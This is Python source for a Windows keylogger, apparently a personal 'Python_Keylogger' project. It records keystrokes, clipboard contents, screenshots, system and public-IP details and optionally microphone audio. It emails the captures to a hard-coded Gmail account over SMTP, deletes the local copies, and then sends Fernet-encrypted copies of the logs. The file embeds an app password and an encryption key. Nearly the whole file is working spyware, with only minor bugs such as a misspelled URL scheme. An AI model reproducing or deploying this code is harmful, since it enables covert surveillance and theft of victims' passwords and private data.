
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import smtplib
import platform
import socket

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

email_address = toaddr = "your_email_address@gmail.com"
app_password = "tejq brld zzdr lmsq"  # Use the generated app password here

toaddr = "your_email_address@gmail.com"

system_information = 'systeminfo.txt'
key_information = "key_log.txt"
clipboard_info = 'clipboard_info.txt'
audio_information = 'audio_information.wav'
screenshot_info = 'screenshot_info.png'


e_system_information = 'e_systeminfo.txt'
e_key_information = "e_key_log.txt"
e_clipboard_info = 'e_clipboard_info.txt'

microphone_time = 10
time_iterations = 15
number_of_iterations_end = 3

file_path = "D:\\Python_Keylogger\\Project"
extend = "\\"
file_merge = file_path + extend

key = "4TeFYldqnskTk4o0aegHT4B_BaqZWDC0fDAgVG1oG6o="


# Sending the mail 
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger"

    body = "Body of the Mail"
    msg.attach(MIMEText(body, 'plain'))

    try:
        with open(attachment, "rb") as att:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(att.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{filename}"')
            msg.attach(p)

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, app_password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        print("Email sent successfully!")

        os.remove(attachment)
        print(f"{filename} deleted successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

send_email(key_information, file_path + extend + key_information, toaddr)

# getting the computer information

def computer_information():
    with open(file_path + extend + system_information,'a') as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)

        try:
            public_ip = get('htpps://api.ipify.org').text
            f.write(f"Public IP Address: {public_ip}\n")

        except Exception:
            f.write("Couldn't get Public IP Address \n")

        f.write("Processor: "+ (platform.processor() + '\n'))
        f.write("System: "+ platform.system() + ' ' + platform.version() + '\n')
        f.write("Machine: "+ platform.machine() + '\n')
        f.write("Host: "+ hostname + "\n")
        f.write("IP Address: "+ IPAddress + '\n')


computer_information()

# getting the clip_board information
def clipboard_information():
    with open(file_path+extend+clipboard_info,'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(f"Clipboard: {pasted_value}\n")

        except Exception:
            f.write("Couldn't get Clipboard Data \n")


clipboard_information()

# getting the microphone recording information 
def microphone():
    fs = 44100  
    seconds = microphone_time
    
    myrecording = sd.rec(int(seconds*fs),samplerate = fs,channels = 2)
    sd.wait()

    write(file_path+extend+audio_information,fs,myrecording)

# microphone()

# getting the screenshot information
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+screenshot_info)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iterations

# running the  simulation 

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count,currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            write_file(keys)
            keys = []
            count = 0

    def write_file(keys):
        with open(file_path + extend + key_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
            with open(file_path + extend + key_information,'w') as f:
                f.write(" ")

            screenshot()
            send_email(screenshot_info,file_path + extend + screenshot_info,toaddr)
            clipboard_information()
            send_email(clipboard_info,file_path + extend + clipboard_info,toaddr)
            computer_information()
            send_email(system_information,file_path + extend + system_information,toaddr)


            number_of_iterations += 1

            currentTime = time.time()
            stoppingTime = time.time() + time_iterations



files_to_encrypt = [file_merge + system_information , file_merge + clipboard_info , file_merge + key_information]
encrypted_file_names = [file_merge + e_system_information , file_merge + e_clipboard_info , file_merge + e_key_information]



count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count],'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)


    with open(encrypted_file_names[count],'wb') as f:
        f.write(encrypted)

    
    send_email(encrypted_file_names[count], encrypted_file_names[count],toaddr)
    count += 1

time.sleep(120)



